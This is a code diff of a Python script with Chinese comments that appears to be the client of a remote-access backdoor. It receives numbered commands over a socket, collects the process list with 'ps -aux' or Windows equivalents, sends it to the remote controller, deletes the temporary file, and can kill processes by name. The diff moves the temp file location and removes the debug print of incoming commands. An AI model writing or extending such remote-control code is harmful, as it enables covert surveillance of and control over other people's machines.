@@ -107,12 +107,12 @@ def Process(sock):
         os.system('del /f /q C:\\ProgramData\\info.txt')
         return
     else:
-        os.system('ps -aux >> info.txt')
-        f = open('info.txt','r')
+        os.system('ps -aux >> %s/info.txt' % TEMP)
+        f = open('%s/info.txt' % TEMP,'r')
         data = f.read()
         f.close()
         Send(data,sock)
-        os.system('rm -f info.txt')
+        os.system('rm -f %s/info.txt' % TEMP)
         return
 
 # Kill进程 by Name
@@ -201,7 +201,6 @@ TEMP = os.getcwd()
 #循环接受命令，一级指令为数字，二级为*（一级）x*（二级）
 while True:
     d = s.recv(1024)
-    print('%s' % d)
     if d == b'0':
         s.send(b'Bye')
         break
